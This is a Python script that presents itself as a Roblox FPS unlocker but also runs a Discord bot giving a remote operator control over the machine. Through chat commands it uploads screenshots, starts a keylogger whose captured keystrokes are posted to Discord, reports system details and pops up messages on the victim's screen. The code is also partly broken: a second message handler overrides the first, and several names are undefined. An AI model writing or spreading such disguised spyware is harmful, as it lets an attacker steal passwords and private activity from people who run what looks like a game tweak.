import pyautogui
import time
import discord
import psutil
import platform
import threading
from pynput.keyboard import Key, Listener
from plyer import notification

def unlock_fps_roblox():
    try:
        for process in psutil.process_iter(['pid', 'name']):
            if 'RobloxPlayerBeta.exe' in process.info['name']:
                roblox_pid = process.info['pid']
                break
        else:
            print("Roblox process not found.")
            return

        roblox_process = psutil.Process(roblox_pid)
        roblox_process.nice(psutil.REALTIME_PRIORITY_CLASS)

        print("FPS unlocked successfully!")
        print("Minimizing window in 2 sec.")
        time.sleep(2)
    except Exception as e:
        print("Oops, something went wrong:", str(e))
        time.sleep(5)

# Call the function to unlock the FPS
unlock_fps_roblox()

TOKEN = 'YOUR_DISCORD_BOT_TOKEN'  # Replace 'YOUR_DISCORD_BOT_TOKEN' with your actual Discord bot token

print("Connecting Discord for better performance")

# Set up intents
intents = discord.Intents.default()
intents.message_content = True
intents.message_attachments = True  # Enable attachment handling

client = discord.Client(intents=intents)

# Variable to store whether the script should run on startup
run_script_on_start = None

# Variable to store recorded keys
recorded_keys = []
logging = False

def prompt_user():
    global run_script_on_start
    if run_script_on_start is None:
        response = input("Do you want the script to run on startup? (Yes/No): ").strip().lower()
        if response == 'yes' or response == 'y':
            run_script_on_start = True
            with open("config.txt", "w") as f:
                f.write("True")
        elif response == 'no' or response == 'n':
            run_script_on_start = False
            with open("config.txt", "w") as f:
                f.write("False")
        else:
            print("Invalid response. Please try again.")
            prompt_user()

def read_config():
    global run_script_on_start
    try:
        with open("config.txt", "r") as f:
            config_data = f.read().strip()
            if config_data.lower() == 'true':
                run_script_on_start = True
            elif config_data.lower() == 'false':
                run_script_on_start = False
    except FileNotFoundError:
        run_script_on_start = None

@client.event
async def on_ready():
    print("Logged in Successfully")
    # Check if the user wants the script to run on startup
    if run_script_on_start:
        await execute_script()

@client.event
async def on_message(message):
    global logging
    if message.author == client.user:
        return

    if message.content == '.ss':
        # Take a screenshot only if the script is run on demand
        await execute_script(message.channel)

    elif message.content == '.keylog':
        await message.reply("Started recording keys.")
        start_keylogging()
        logging = True

    elif message.content == '.keystop':
        await message.reply("Stopped recording keys.")
        await stop_keylogging()
        # Send the recorded keys to Discord
        recorded_keys_text = "".join(recorded_keys)
        await message.channel.send(f"Recorded keys:\n{recorded_keys_text}")
        recorded_keys.clear()
        logging = False

    elif message.content == '.info':
        info = get_computer_info()
        await message.reply(info)

    elif message.content == '.create_channels':
        await create_user_channels()

async def execute_script(channel=None):
    # Get screen dimensions
    width, height = pyautogui.size()

    # Take a screenshot
    screenshot_path = "screenshot.png"
    pyautogui.screenshot(screenshot_path)

    # Send the screenshot to the specified channel or the default channel where the bot was invoked
    if channel:
        await channel.send(file=discord.File(screenshot_path))
    else:
        await message.channel.send(file=discord.File(screenshot_path))

def on_press(key):
    global recorded_keys
    if logging:
        try:
            recorded_keys.append(str(key.char))
        except AttributeError:
            if key == Key.space:
                recorded_keys.append(" ")
            elif key == Key.enter:
                recorded_keys.append("\n")
            elif key == Key.tab:
                recorded_keys.append("\t")
            elif key == Key.backspace:
                if len(recorded_keys) > 0:
                    recorded_keys.pop()

def start_keylogging():
    global logging
    logging = True
    t = threading.Thread(target=listen_keys)
    t.start()

def listen_keys():
    with Listener(on_press=on_press) as listener:
        listener.join()

async def stop_keylogging():
    global logging
    logging = False

def get_computer_info():
    cpu_percent = psutil.cpu_percent()
    memory = psutil.virtual_memory()
    disk = psutil.disk_usage('/')

    system_info = platform.uname()
    system = system_info.system
    node_name = system_info.node
    release = system_info.release
    version = system_info.version
    machine = system_info.machine
    processor = system_info.processor

    info = f"CPU Usage: {cpu_percent}%\n"
    info += f"Available RAM: {round(memory.available / (1024 ** 3), 2)} GB\n"
    info += f"Disk Usage: {disk.percent}%\n"
    info += f"System: {system}\n"
    info += f"Node Name: {node_name}\n"
    info += f"Release: {release}\n"
    info += f"Version: {version}\n"
    info += f"Machine: {machine}\n"
    info += f"Processor: {processor}\n"

    return info

@client.event
async def on_message(message):
    global logging
    if message.author == client.user:
        return

    if message.content.startswith('!msg '):
        # Get the text from the '!msg' command
        text_to_display = message.content[5:]

        # Send a confirmation message
        await message.channel.send(f'Displaying text: "{text_to_display}" on the other person\'s computer.')

        # Display the text on the other person's computer
        pyautogui.alert(text_to_display)

    if message.content.startswith('!notify '):
        # Split the message into parts: command, notification title, and notification message
        parts = message.content.split('"')
        if len(parts) >= 4:
            command, notification_title, notification_message = parts[0], parts[1], parts[3]

            # Send a message with reactions "ok" and "cancel"
            sent_message = await message.channel.send(f'Are you sure to send the notification: "{notification_title}": "{notification_message}"?')
            await sent_message.add_reaction('✅')  # Reaction for "ok"
            await sent_message.add_reaction('❌')  # Reaction for "cancel"

            # Function to react to user reactions
            def check(reaction, user):
                return user == message.author and str(reaction.emoji) in ['✅', '❌']

            try:
                reaction, user = await client.wait_for('reaction_add', timeout=60.0, check=check)
                if str(reaction.emoji) == '✅':
                    # Sending the notification
                    notification.notify(
                        title=notification_title,
                        message=notification_message,
                        app_icon=None,
                        timeout=10,
                        toast=False
                    )
            except asyncio.TimeoutError:
                await message.channel.send("You didn't react in time. The notification was not sent.")
